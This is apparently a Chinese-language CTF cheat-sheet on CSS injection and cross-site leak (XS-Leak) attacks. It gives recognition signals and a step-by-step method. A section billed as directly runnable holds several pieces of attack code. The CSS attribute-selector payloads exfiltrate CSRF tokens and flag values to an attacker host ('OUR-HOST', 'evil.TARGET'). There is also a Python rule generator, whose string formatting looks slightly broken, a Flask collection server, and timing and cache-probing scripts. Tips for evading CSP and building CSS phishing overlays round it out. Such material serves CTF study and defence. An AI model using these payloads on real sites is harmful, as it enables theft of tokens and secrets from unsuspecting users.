---
title: CSS 注入与 XS-Leak（选择器泄露、跨站状态泄漏）
category: web
tags: [css-injection, xs-leak, exfiltration, xss-bypass]
signals: [输入被放进 <style> 或 style 属性里, 过滤了 <script> 但允许 <style> 和 @import, 提示「无 JS」「CSP 禁止内联脚本」, 页面会显示 flag 形式的字符串作为属性值, 有 CSP 限定了只能加载同源图片, 题面要求带 cookie 访问并外带, 出现 link rel=canonical 或 meta name=csrf-token, 用户输入回显在 class/name 属性, 题面提示词「CSS」「泄露」「leak」]
difficulty: hard
source: "PortSwigger Research / xsleaks.dev"
tools: [burpsuite, python, flask]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 用户输入（`?theme=`、昵称、颜色值）被写进 `<style>` 或 `style=""` 里。
- CSP 是 `script-src 'none'` 或带 nonce，但 `style-src` 宽松；`img-src` 允许同源或 `*`。
- 有"预览主题"、"自定义 CSS"、"富文本允许 style"。
- 页面里某个元素携带 `flag` / `csrf-token` / `api_key` 属性，或在 `<meta>`/`<input value=>` 里。
- 需要一个 **attacker 服务器**收取请求（CTF 里常给一个 `http://OUR-HOST`）。
- 题面提示：`CSS`、`无 JS`、`CSP`、`泄露`、`leak`、`side channel`、`bot`。
- 响应差异极小（长度差、加载时间差、图片是否 404）。

## 二、原理

### 1. 纯 CSS 注入的两条路

**(a) 选择器 + 属性值外带**：CSS 能把"页面里的值"加密成"请求 URL"，因为属性选择器能匹配**子串**：

```css
/* 逐字符猜 input[value] 的前缀 */
input[name="csrf"][value^="a"] { background: url("//evil.TARGET/?p=a"); }
input[name="csrf"][value^="b"] { background: url("//evil.TARGET/?p=b"); }
```

浏览器会为匹配成功的元素**去拉那张背景图**，攻击者服务器就能看到 `p=a` —— 一个字一个字地把 token 猜出来。

**(b) `@import` 级联外带**：`@import` 只能在开头，但如果能注入整段 CSS，可以用 `@import url(...)` 把外部的 CSS 拉进来 → **先注入 1 次，后续补充的规则会重新加载**（缓存 bust）。

### 2. 属性选择器能力表

| 选择器 | 匹配 | 用途 |
|---|---|---|
| `[a^="x"]` | 前缀 | 逐字前推（最常用） |
| `[a$="x"]` | 后缀 | 从尾向前 |
| `[a*="x"]` | 子串 | 二分定位 |
| `[a\|="x"]` | 相等或 `x-` 前缀 | 枚举值 |

### 3. XS-Leak（跨站泄漏）

当跨站页面**无法读取**，但能观察"副作用"时：

| 载体 | 观测 | 例子 |
|---|---|---|
| 加载时间 | `onload` 计时 | 已登录用户 `/admin` 返回大页面，未登录 302 |
| 资源是否缓存 | `performance.getEntriesByType('resource')` | 跨站探测是否命中浏览器缓存 |
| 错误事件 | `onerror` | `<img>` 404 与 200 |
| 跳转 | `window.frames.length` | 是否被框架化 |
| CSS 注入 | 背景加载 | 见上（等价 XSS） |
| **postMessage 泄漏** | MessageChannel | 监听别的站 postMessage 到当前窗口 |
| **`window.open` + `name`** | `window.name` | 跨站保留字符串 |

CTF 里最常见的组合：**CSS 注入（无 JS）+ 有 bot**，让 bot 访问我们的页面 → 我们的页面内嵌目标站 iframe → iframe 里的 CSS 已注入 → 外带。

## 三、解题步骤

1. **确认注入点**：输入被放进 `<style>`、`style=`、或 `class=`，看能不能注入 `}` 和新的 `{`。
2. **确认能加载外部资源**：CSP 里 `img-src` 是否允许我们的域名；`@import` 能否跨域。
3. **找敏感属性**：`<input value="flag{...}">`、`<meta content="...">`、`<div data-token="...">`。
4. **写泄漏 payload**（一次一个字）：

```html
<style>input[name=csrf][value^="a"]{background:url('http://OUR-HOST/?a')}</style>
```
5. **让 bot 访问**：提交 payload 到会被渲染的字段，等 bot 来抓取 → 我们的服务器收到首字。
6. **循环**：用已知前缀逐步加长，直到拿到完整 flag。
7. **无 JS 时的进阶**：用 `@import` 链 + 多个 `<style>` 生成"每次请求加长一个字符"。

## 四、可直接运行的脚本

CSS 泄漏 payload 模板（前缀型）：

```html
<style>
@import url('http://OUR-HOST/start');
input[name="csrf"][value^="a"] { background: url('http://OUR-HOST/?l=a'); }
input[name="csrf"][value^="b"] { background: url('http://OUR-HOST/?l=b'); }
</style>
```

自动生成"逐字前推"的 CSS（给定字符集与前缀）：

```python
import string

CHARS = string.ascii_letters + string.digits + "{}_-"

def gen_css(prefix, field="csrf", tag="input"):
    rules = []
    for c in CHARS:
        val = (prefix + c).replace('"', '\\"')
        rules.append('%s[name="%s"][value^="%s"]{background:url("http://OUR-HOST/?p=%s")"%s'
                     % (tag, field, val, val, "}") )
    return "\n".join(rules) + "}"

print(gen_css("flag{"))
```

服务端：把收到的 `p=` 存下来，循环生成下一轮：

```python
import requests
from flask import Flask, request

app = Flask(__name__)
KNOWN = {"flag{"}

@app.route("/")
def collect():
    p = request.args.get("p", "")
    if p.startswith("flag{") and len(p) > max(KNOWN, key=len).__len__():
        KNOWN.add(p)
        print("[+]", p)
    return "", 200

@app.route("/gen")
def gen():
    prefix = max(KNOWN, key=len)
    return gen_css(prefix)
```

计时型 XS-Leak（判断已登录用户是否访问了某个资源）：

```html
<script>
const t0 = performance.now();
fetch("http://target.TARGET/private/image.png", {mode:"no-cors"})
  .finally(() => {
    const dt = performance.now() - t0;
    fetch("http://OUR-HOST/?t=" + Math.round(dt));
  });
</script>
```

`prefetch` 缓存探测（跨站判断资源是否被缓存过）：

```html
<script>
const link = document.createElement("link");
link.rel = "prefetch";
link.href = "http://target.TARGET/admin";
document.head.appendChild(link);
setTimeout(() => {
  const res = performance.getEntriesByType("resource").filter(e => e.name.includes("/admin"));
  fetch("http://OUR-HOST/?cached=" + res.length);
}, 500);
</script>
```

## 五、常见坑 / 变体

- **`background:url()` 被 CSP 挡**：`img-src` 不允许外部域 → 用**同源**路径 + 重定向，或把 `p=` 放在 hash 里（不经过 CSP）。
- **`@import` 位置**：必须在样式表最前面；如果注入点在中段，先闭合 `}` 再 `@import`。
- **CSS 特化（specificity）**：后写的规则可能被覆盖 → 每条规则加 `!important`。
- **输入被 HTML 转义**：`"` 被转成 `&quot;` → 用单引号 `'` 闭合属性值。
- **`<style>` 被过滤**：改用 `style="background:url(...)"`（内联），但只能匹配当前元素。
- **变体：`@font-face` 泄漏**：用 `unicode-range` + `src:url()` 探测字符集。
- **变体：`scroll-to-text` / `iframe` 高度差**（text fragment 泄漏）。
- **变体：`window.name` 保留**（跨导航后仍可取）。
- **变体：CSP 泄漏（`report-uri`）** —— 注入 `<script src=x>` 让 CSP 上报完整 URL（含敏感路径）。
- **变体：CSS 注入实现"钓鱼"** —— 覆盖登录框位置，诱导输入。
- **注意**：外带 URL 里别放禁止字符（`{}` 需 URL 编码）。

## 六、参考来源

- [PortSwigger Research — Blind CSS Exfiltration](https://portswigger.net/research/blind-css-exfiltration)
- [xsleaks.dev — CSS Injection](https://xsleaks.dev/docs/attacks/css-injection/)
- [xsleaks.dev — XS-Leaks Wiki](https://xsleaks.dev/)
- [PortSwigger — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [MDN — Attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)
- [PortSwigger — Web cache deception](https://portswigger.net/web-security/web-cache-deception)
